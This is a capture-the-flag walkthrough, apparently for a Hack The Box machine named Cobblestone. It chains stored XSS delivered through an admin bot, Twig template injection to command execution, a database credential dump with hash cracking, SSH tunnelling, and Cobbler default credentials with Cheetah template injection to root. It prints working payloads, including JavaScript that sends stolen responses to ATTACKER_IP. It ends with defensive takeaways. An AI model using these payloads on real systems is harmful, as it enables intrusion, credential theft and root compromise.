Section 02

Recon & Foothold

01
Vhost Discovery & Application Mapping
nmap · vhosts · skin suggestion feature · admin-only endpoints

Two ports are open. The web app is a Minecraft skin gallery with user registration, a skin gallery, and a skin suggestion form at /suggest_skin.php. The admin panel (discovered through source inspection) includes an admin-only /preview_banner.php endpoint not linked from the public interface. An admin bot periodically reviews skin suggestions — confirming the XSS attack surface.

bash
nmap -sC -sV -p- 10.129.232.170
22/tcp open  ssh    OpenSSH 9.2p1 Debian
80/tcp open  http   Apache/2.4.62

# Add all vhosts
echo "10.129.232.170 cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb mc.cobblestone.htb" >> /etc/hosts

# Key admin endpoints discovered:
/suggest_skin.php   ← user-facing, XSS vector

Section 03

Foothold — XSS → Twig SSTI → RCE

02
Stored XSS in Skin Suggestion URL Field
suggest_skin.php · unsanitised URL · admin bot trigger

The url field in the skin suggestion form is rendered unsanitised in the admin review panel. Submitting an <img src> tag to an attacker-controlled server confirms XSS — the admin bot visits the suggestions page and triggers the payload. This is the gateway to reach the admin-only preview_banner.php endpoint.

bash — confirm XSS callback
# Test XSS: admin bot should fetch our IP
curl -s -b cookies.txt -X POST "http://cobblestone.htb/suggest_skin.php" \
  --data-urlencode 'username=attacker' \
  --data-urlencode 'name=test_skin' \
  --data-urlencode 'url=<img src=http://ATTACKER_IP:9999/xss_test>'

# Listener receives callback from admin bot → XSS confirmed
10.129.232.170 - GET /xss_test HTTP/1.1
✓
XSS Confirmed: Admin bot triggers our payload. Now weaponise to reach the admin-only preview_banner.php Twig SSTI endpoint.
03
XSS → XHR to preview_banner.php → Twig SSTI Confirmed
XMLHttpRequest · Twig {{7*7}} · exfiltrate response

A JavaScript payload hosted on the attacker's HTTP server makes a synchronous XHR POST to /preview_banner.php from the admin's browser session, sending a Twig test expression. The response is exfiltrated back to the attacker via an image request. The Welcome 49 response confirms Twig template injection — {{7*7}} was evaluated server-side.

javascript — test.js (hosted on attacker :9999)
// Admin bot loads this script → executes in admin session
var x = new XMLHttpRequest();
x.open('POST', '/preview_banner.php', false);
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('first={{7*7}}');
new Image().src = 'http://ATTACKER_IP:9999/SSTI?d=' + encodeURIComponent(x.responseText);

# Deliver via skin suggestion XSS
url=<script src="http://ATTACKER_IP:9999/test.js"></script>

# Response exfiltrated:
Welcome 49   ← 7*7 evaluated → Twig SSTI confirmed
✕
Twig SSTI Confirmed: {{7*7}} evaluates to 49 server-side. The first parameter is passed directly to the Twig template engine with no sanitisation or sandboxing.
04
Twig SSTI → RCE via map filter (AppArmor enforced)
{{["id"]|map("system")|join}} · www-data · AppArmor restrict

Twig SSTI escalates to RCE via the map filter with system as the callable. The Apache process runs under the apache2//cobblestone AppArmor profile in enforce mode, blocking: file writes to /opt/, /tmp/, /var/www/html/; outbound network connections from child processes; and reading outside the web directory. However, reading config.php within the web root is permitted.

javascript — rce.js — escalate SSTI to command execution
// Twig RCE payload via map filter
var x = new XMLHttpRequest();
x.open('POST', '/preview_banner.php', false);
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('first={{["id"]|map("system")|join}}');
new Image().src = 'http://ATTACKER_IP:9999/RCE?d=' + encodeURIComponent(x.responseText);

uid=33(www-data) gid=33(www-data) groups=33(www-data)

# AppArmor blocks: reverse shells, writes to /tmp, outbound connections
# AppArmor allows: reading web root files including config.php
⚠
AppArmor Constraint: The apache2//cobblestone (enforce) profile prevents direct exploitation paths (reverse shells, file drops). Lateral movement must go through permitted operations — reading application config files and database queries are still viable.
Section 04

User Flag — MySQL Dump & SSH

05
DB Config Read → MySQL Dump → Hash Crack
config.php · mysql cli · SHA256 · hashcat -m 1400

The SSTI is used to read config.php (allowed by AppArmor) which contains MySQL credentials. A second SSTI payload queries the users table, extracting SHA256 password hashes. The hash for user cobble is cracked offline with hashcat against rockyou.txt.

javascript — db_creds.js — read config + dump users
// Read config.php (AppArmor allows web root reads)
x.send('first={{["cat /var/www/html/config.php"]|map("system")|join}}');
DB_HOST: localhost  DB_USER: root  DB_NAME: cobblestone

// Query users table
x.send('first={{["mysql -u root cobblestone -e \"SELECT username,password FROM users\""]|map("system")|join}}');
username  password
admin     <admin_sha256>
cobble    <cobble_sha256>

# Crack cobble's SHA256 hash offline
hashcat -m 1400 cobble_hash.txt /usr/share/wordlists/rockyou.txt
cobble_hash:iluvdannymorethanyouknow

Credentials Recovered: cobble : iluvdannymorethanyouknow
06
SSH as cobble → chroot rbash → user.txt
SSH · chroot jail · rbash · limited commands

SSH login succeeds with the cracked password. The cobble user is placed in a chroot jail with restricted bash (rbash). Available commands are limited to cat, grep, ls, ps, rbash, ss. Despite the restrictions, /proc is mounted — enabling process and network visibility. The user flag is readable directly.

Section 05

Privilege Escalation — Cobbler Cheetah Injection

07
SSH Port Forward → Cobbler XMLRPC Auth
ssh -L · Cobbler 3.3.6 · default creds cobbler:cobbler

Port 25151 is only accessible from localhost. SSH's port forwarding capability bridges the gap — the chroot jail restricts the shell but not SSH's tunnelling feature. Cobbler's default credentials (cobbler:cobbler) were never changed, providing authenticated API access to a provisioning server running as root.

bash
# Forward Cobbler XMLRPC to attacker localhost
ssh -L 25151:127.0.0.1:25151 cobble@10.129.232.170

# Authenticate with default Cobbler credentials
curl -s "http://127.0.0.1:25151/" -X POST -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
  <methodCall><methodName>login</methodName><params>
    <param><value><string>cobbler</string></value></param>
    <param><value><string>cobbler</string></value></param>
  </params></methodCall>'

<value><string>TOKEN_HERE</string></value>
← Valid auth token returned
⚠
Chroot Bypass via SSH Tunnelling: The cobble user's chroot restricts interactive shell commands but does not prevent SSH port forwarding. Any service reachable via tunnelling is fully accessible from the attacker machine — the chroot is not a security boundary for network access.
08
Cheetah Template Injection via generate_autoinstall
write_autoinstall_template · __import__('os') · root RCE

Cobbler's generate_autoinstall API method renders autoinstall templates using the Cheetah template engine — executed in the context of the Cobbler daemon running as root. Cheetah's #set directive allows executing arbitrary Python via __import__('os').popen(). The attack requires: writing a malicious template, creating a distro (requires kernel/initrd paths), linking a profile to the template, then triggering rendering. The command output appears directly in the API response.

bash — Step 1: write malicious Cheetah template
# Cheetah #set directive + __import__('os') bypasses any sandbox
curl -s "http://127.0.0.1:25151/" -X POST -H "Content-Type: text/xml" \
  -d "<?xml version=\"1.0\"?>
  <methodCall><methodName>write_autoinstall_template</methodName>
  <params>
    <param><value><string>evil.ks</string></value></param>
    <param><value><string>#set x = __import__('os').popen('id').read()
\$x</string></value></param>
    <param><value><string>$TOKEN</string></value></param>
  </params></methodCall>"
bash — Steps 2-3: create distro + profile linked to evil template
# Create distro (required prerequisite for profile) DH=$(curl -s ... new_distro ...) # Set name:evil_distro, kernel:/vmlinuz, initrd:/initrd.img → save # Create profile → link to distro + autoinstall template PH=$(curl -s ... new_profile ...) # Set name:evil_profile, distro:evil_distro, autoinstall:evil.ks → save
bash — Step 4: trigger rendering → root command execution
curl -s "http://127.0.0.1:25151/" -X POST -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
  <methodCall><methodName>generate_autoinstall</methodName>
  <params>
    <param><value><string>evil_profile</string></value></param>
  </params></methodCall>'

<value><string>uid=0(root) gid=0(root) groups=0(root)</string></value>

Root RCE via Cheetah: generate_autoinstall renders the template as root. Change payload to cat /root/root.txt to read the root flag directly from the XMLRPC response.

key takeaways
01 // XSS AS PIVOT
Stored XSS Is a Stepping Stone to SSTI
XSS alone rarely results in server compromise, but here it was the only path to reach an admin-only endpoint with SSTI. Admin bots open a persistent attack surface — any XSS reachable by an admin session can be weaponised to probe internal, authenticated-only functionality not accessible to regular users.
02 // APPARMOR LIMITS
AppArmor Is Not a Silver Bullet
The AppArmor profile successfully blocked reverse shells and file drops — but couldn't prevent reading config.php or executing MySQL queries. Security controls must be layered: AppArmor alone cannot compensate for SSTI vulnerabilities. Secrets (DB passwords) should never live in files readable by the web server process.
03 // CHROOT LIMITS
Chroot Doesn't Block SSH Tunnelling
The cobble user's rbash chroot restricted interactive commands but SSH port forwarding operated at a lower level, completely bypassing the chroot jail. Chroot is not a security boundary for network access — proper network-level controls (iptables, no SSH for service accounts) are required alongside chroot jails.
04 // DEFAULT CREDS
Cobbler Default cobbler:cobbler
Cobbler's default credentials were never rotated, granting full administrative API access to a service running as root. Provisioning servers are high-value targets — they require strong unique credentials, network isolation to management interfaces only, and regular auditing of API access logs.
05 // TEMPLATE ENGINES
Cheetah generate_autoinstall = Root RCE
Cobbler's generate_autoinstall renders Cheetah templates as root with no sandboxing. The #set x = __import__('os').popen('cmd').read() technique bypasses any Python import restrictions. Any provisioning API that renders user-supplied templates as a privileged user is a root RCE waiting to happen.
06 // INTERNAL SERVICES
Always Enumerate Internal Ports After Initial Access
Port 25151 was only visible from localhost — never scannable externally. The cobble user's restricted ss command was sufficient to reveal it. After gaining any foothold, always enumerate internal services — provisioning servers, databases, management APIs, and container runtimes running as root are common high-value targets.
